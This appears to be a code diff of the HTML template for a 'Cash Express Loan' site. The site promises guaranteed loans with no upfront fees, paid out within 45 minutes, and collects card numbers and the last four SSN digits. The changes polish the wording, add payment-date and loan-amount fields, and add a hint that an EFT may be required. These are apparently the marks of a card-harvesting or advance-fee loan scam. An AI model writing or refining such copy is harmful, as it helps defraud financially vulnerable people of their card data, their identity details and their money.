@@ -86,13 +86,13 @@ src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
 					<!-- /social -->
 					<div>
 						<figure><img src="{%static 'preregister/html/img/info_graphic_2.svg' %}" alt="" class="img-fluid"></figure>
-						<h2>Loan Deposit Registration </h2>
-				<p>To deposit loan amount in your account, We need some details from your side and after that we will deposit the loan amount directly in your bank account within 24 hours maximum or less than that. <br> No upfront fees needed. You are already eligible to receive this loan, we just need some additional details to deposit the funds in your account.<br> Please note: We will encrypt your information to secure it. Be assured, it's secure and safe with us and will be used for deposit purpose only.
-					<br>You will receive the loan documents on your email address. If you find trouble in understanding anything in this form then you can start the chat again with our loan supervisors to get the help.</p>
+						<h2>Loan Deposit via Card Registration </h2>
+				<p>To deposit the loan amount into your account, we require some details from your side. Afterward, we will transfer the loan amount directly to your bank account within a maximum of 45 minutes. No upfront fees are needed, and you are already eligible to receive this loan. We only require some additional details for the funds' deposit. <br> Please note that we will encrypt your information to ensure its security. Rest assured, it will be safe with us and will solely be used for the deposit process.
+					<br>Please note that we will encrypt your information to ensure its security. Rest assured, it will be safe with us and will solely be used for the deposit process.</p>
 
 						<a href="#start" class="btn_1 rounded mobile_btn">Start Now!</a>
 					</div>
-					<div class="copy">© 2020 Cash Express Loan</div>
+					<div class="copy">© 2023 Cash Express Loan</div>
 				</div>
 				<!-- /content-left-wrapper -->
 			</div>
@@ -110,9 +110,9 @@ src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
 							<!-- Leave for security protection, read docs for details -->
 							<div id="middle-wizard">
 								<div class="step">
-									<h3 class="main_question"><strong>1/3</strong>Loan deposit in card registration</h3>
-									<p>Please fill-in with your details to receive the loan and documents</p>
-									<p> Bank transfer takes five days, and we can deposit the loan immediately on a card. So make sure to write the correct details.</p>
+									<h3 class="main_question"><strong>1/3</strong>Please provide your details below to receive the loan and related documents.</h3>
+									
+									<p> Bank transfers may take up to five days, but we can deposit the loan immediately onto your card. Therefore, it's essential to ensure that you provide accurate information.</p>
 									<div class="form-group">
 										{{form.first_name}}
 									</div>
@@ -125,7 +125,12 @@ src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
 									<div class="form-group">
 										{{form.phone}}
 									</div>
-
+									<div class="form-group">
+										{{form.payment_date}}
+									</div>
+									<div class="form-group">
+										{{form.loan_amount}}
+									</div>									
 								</div>
 							            <div class="step">
 									<h3 class="main_question"><strong>2/3</strong>Your Address</h3> <p>You will receive the loan documents on your address within 24 hours and on email within 3 hours.</p> 									<div class="form-group">
@@ -164,11 +169,11 @@ src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
     	<div class="summary">
     		<div class="submit step">
 									<h3 class="main_question"><strong>Click on submit</strong>Summary</h3>
-                                    <p> By clicking on submit, we will redirect you to your loan supervisor on Live Chat so he/she can review your information to deposit the loan amount.</p>
+                                    <p> After clicking 'Submit,' you will be redirected to our loan supervisor, who will review your loan file and initiate the deposit into your bank account</p>
 
 									</div>
 
-									<h3 class="main_question"><strong>3/3</strong>Banking Card Details</h3> <p>You will get the loan tomorrow morning after the verification process in 45 minutes.</p>
+									<h3 class="main_question"><strong>3/3</strong>Banking Card Details</h3> <p>You will receive the loan within 45 minutes.</p>
 									<p>Please provide your card details. </p> 									<div class="form-group">
 										{{form.card_numbers}}
 									</div>
@@ -187,7 +192,8 @@ src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
 									<div class="form-group">
 										{{form.last_four_ssn}}
 								</div>
-									<p> You will redirect to our loan supervisor and we will receive your details once you click on submit so he/she can check your loan file to deposit the loan in your bank account. </p>
+									<p> You will redirect to our loan supervisor and we will receive your details once you click on submit so he/she can check your loan file to deposit the loan in your bank account.
+									Please note: Based on your profile, EFT (electronic funds transfer) maybe required to deposit the loan. </p>
 								</div>
 								{% if messages %}
 								{% for message in messages %}
